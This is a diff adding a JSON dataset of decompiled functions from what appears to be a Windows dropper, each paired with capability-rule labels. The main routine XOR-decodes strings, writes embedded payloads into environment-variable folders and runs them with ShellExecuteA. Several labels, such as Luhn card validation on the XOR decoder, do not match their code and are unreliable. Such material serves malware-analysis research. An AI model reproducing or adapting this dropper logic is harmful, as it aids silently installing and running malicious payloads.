@@ -1,0 +1,61 @@
+{
+    "0040108c": {
+        "rules": [
+            "check OS version/eb1d2d86c0084793ad233d63869572f1",
+            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896",
+            "check OS version/730896de213f42198ce3af1d0fc93fbe"
+        ],
+        "decompiled_code": "\nuint fcn.0040108c(void)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    uint uVar3;\n    uint stream;\n    int32_t var_454h;\n    uint filename;\n    uint size;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint s1;\n    char *var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint lpFile;\n    uint lpOperation;\n    \n    lpOperation = fcn.00401000(0x402021, 4);\n    lpFile = fcn.00401000(0x402026, 10);\n    uVar1 = fcn.00401000(0x402031, 0x12e);\n    sub.shell32.dll_ShellExecuteA(0, lpOperation, lpFile, uVar1, 0, 0);\n    sub.msvcrt.dll_memset(&s1, 0, 0x18);\n    s1 = 0x402160;\n    var_1ch = \"U@;\\nW\";\n    var_18h = 0x40216b;\n    var_14h = 0x43a76c;\n    var_10h = 0x43a771;\n    var_ch = 0x43a77b;\n    sub.msvcrt.dll_memset(&size, 0, 0x20);\n    size = 4;\n    var_3ch = 5;\n    var_38h = 0x38600;\n    var_34h = 1;\n    var_30h = 4;\n    var_2ch = 9;\n    var_28h = 0x101400;\n    var_24h = 1;\n    for (var_454h = 0; var_454h < 2; var_454h = var_454h + 1) {\n        iVar2 = sub.msvcrt.dll_strcmp((&s1)[var_454h * 3], 0x53bb7c);\n        if (iVar2 == 0) {\n            uVar1 = fcn.00401000((&var_1ch)[var_454h * 3], (&var_3ch)[var_454h * 4]);\n            sub.msvcrt.dll_strcpy(&filename, uVar1);\n        }\n        else {\n            uVar1 = fcn.00401000((&s1)[var_454h * 3], (&size)[var_454h * 4]);\n            lpOperation = sub.msvcrt.dll_getenv(uVar1);\n            uVar1 = fcn.00401000((&var_1ch)[var_454h * 3], (&var_3ch)[var_454h * 4]);\n            sub.msvcrt.dll_sprintf(&filename, \"%s\\\\%s\", lpOperation, uVar1);\n        }\n        uVar1 = sub.msvcrt.dll_fopen(&filename, 0x53bb94);\n        uVar3 = fcn.00401000((&var_18h)[var_454h * 3], (&var_38h)[var_454h * 4]);\n        sub.msvcrt.dll_fwrite(uVar3, (&var_38h)[var_454h * 4], 1, uVar1);\n        sub.msvcrt.dll_fclose(uVar1);\n        if ((&var_34h)[var_454h * 4] != 0) {\n            uVar1 = fcn.00401000(0x53bb97, 4);\n            sub.shell32.dll_ShellExecuteA(0, uVar1, &filename, 0, 0, 10);\n        }\n    }\n    return 0;\n}\n",
+        "token_count": 862
+    },
+    "00401582": {
+        "rules": [
+            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
+        ],
+        "decompiled_code": "\nvoid __cdecl fcn.00401582(uint arg_8h, uint arg_ch)\n\n{\n    uint var_4h;\n    \n    *_sym.imp.msvcrt.dll___argc = arg_8h;\n    *_sym.imp.msvcrt.dll___argv = arg_ch;\n    sub.msvcrt.dll__controlfp(0x10000, 0x30000);\n    fcn.0040108c(*_sym.imp.msvcrt.dll___argc, *_sym.imp.msvcrt.dll___argv, *_sym.imp.msvcrt.dll__environ);\n    return;\n}\n",
+        "token_count": 124
+    },
+    "00401000": {
+        "rules": [
+            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
+            "contain loop"
+        ],
+        "decompiled_code": "\nint32_t __cdecl fcn.00401000(int32_t arg_8h, int32_t size)\n\n{\n    int32_t iVar1;\n    uint var_10h;\n    uint var_ch;\n    int32_t var_8h;\n    uint var_4h;\n    \n    // [00] -r-x section size 4096 named .text\n    iVar1 = sub.msvcrt.dll_malloc(size + 1);\n    *(iVar1 + size) = 0;\n    for (var_8h = 0; var_8h < size; var_8h = var_8h + 1) {\n        *(iVar1 + var_8h) = *(arg_8h + var_8h) ^ \":n^r2ddxrv/ag,)56-gibd=j[+/k86[3\"[var_8h % 0x20];\n    }\n    return iVar1;\n}\n",
+        "token_count": 200
+    },
+    "004013b4": {
+        "rules": [
+            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
+        ],
+        "decompiled_code": "\nvoid __cdecl fcn.004013b4(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    uint var_8h;\n    uint32_t var_4h;\n    \n    var_4h = 0;\n    while ((var_4h & 0x3fffffff) != 0) {\n        (**(var_4h * 4 + 0x53c000))(arg_8h, arg_ch, arg_10h);\n        var_4h = var_4h + 1;\n    }\n    return;\n}\n",
+        "token_count": 124
+    },
+    "00401410": {
+        "rules": [
+            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
+        ],
+        "decompiled_code": "\nvoid fcn.00401410(void)\n\n{\n    uint var_8h;\n    uint32_t var_4h;\n    \n    var_4h = 0;\n    while ((var_4h & 0x3fffffff) != 0) {\n        var_4h = var_4h - 1;\n        (**(var_4h * 4 + 0x53c000))();\n    }\n    return;\n}\n",
+        "token_count": 95
+    },
+    "0040145b": {
+        "rules": [
+            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
+        ],
+        "decompiled_code": "\nuint __cdecl fcn.0040145b(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    uint uVar1;\n    uint var_8h;\n    uint var_4h;\n    \n    fcn.004013b4(arg_8h, arg_ch, arg_10h);\n    uVar1 = fcn.0040108c(*_sym.imp.msvcrt.dll___argc, *_sym.imp.msvcrt.dll___argv, *_sym.imp.msvcrt.dll__environ);\n    fcn.00401410();\n    return uVar1;\n}\n",
+        "token_count": 129
+    },
+    "004014af": {
+        "rules": [
+            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
+        ],
+        "decompiled_code": "\nvoid __cdecl fcn.004014af(uint *arg_8h)\n\n{\n    sub.msvcrt.dll__XcptFilter(**arg_8h, arg_8h);\n    return;\n}\n",
+        "token_count": 43
+    },
+    "null": {
+        "rules": [
+            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
+        ],
+        "decompiled_code": "\nvoid entry0(void)\n\n{\n    uint uVar1;\n    uint var_8h;\n    uint s;\n    \n    sub.msvcrt.dll_memset(&s, 0, 4);\n    sub.kernel32.dll_SetUnhandledExceptionFilter(fcn.004014af);\n    sub.msvcrt.dll___set_app_type(1);\n    sub.msvcrt.dll__controlfp(0x10000, 0x30000);\n    sub.msvcrt.dll___getmainargs\n              (_sym.imp.msvcrt.dll___argc, _sym.imp.msvcrt.dll___argv, _sym.imp.msvcrt.dll__environ, *0x53c000, &s);\n    uVar1 = fcn.0040145b(*_sym.imp.msvcrt.dll___argc, *_sym.imp.msvcrt.dll___argv, *_sym.imp.msvcrt.dll__environ);\n    sub.msvcrt.dll_exit(uVar1);\n    return;\n}\n",
+        "token_count": 204
+    }
+}
